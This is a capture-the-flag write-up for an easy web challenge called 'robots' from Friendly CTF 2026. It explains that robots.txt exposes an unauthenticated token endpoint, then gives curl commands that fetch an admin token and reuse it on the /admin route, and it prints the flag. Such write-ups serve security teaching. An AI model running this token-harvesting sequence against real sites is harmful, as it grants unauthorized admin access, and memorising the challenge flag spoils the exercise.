---
title: "robots"
ctf: "Friendly CTF 2026"
date: 2026-09-28
category: web
difficulty: easy
author: "L-BOH"
---

# robots

## Summary

The robots file points to a hidden endpoint that returns an administrator token. Robots exclusion is a crawler hint, not access control.

## Root cause

The hidden endpoint has no authentication:

~~~javascript
app.get('/admin-token', (req, res) => {
  return res.json({ 'Authorization token': ADMIN_TOKEN });
});
~~~

Putting this route in robots.txt does not restrict HTTP clients. Any visitor can request it and receive a token that grants access to the admin route.

## Vulnerability

Requesting /robots.txt reveals two disallowed paths:

~~~text
/admin-token
/admin
~~~

The first path is still directly reachable by a browser or curl. It returns a token that the second path accepts as administrator authorization.

## Exploit

~~~bash
curl -s https://robots.web2.friendly-ctf.securinets.tn/robots.txt
curl -s https://robots.web2.friendly-ctf.securinets.tn/admin-token
curl -H "Authorization: Bearer TOKEN_FROM_PREVIOUS_RESPONSE" \
  https://robots.web2.friendly-ctf.securinets.tn/admin
~~~

Copy the JWT returned by /admin-token into the Authorization header. The /admin response contains the flag.

## Flag

~~~text
Securinets{hum4n_4r3_4lw4ys_sm4rt3r_th4n_r0b0ts}
~~~
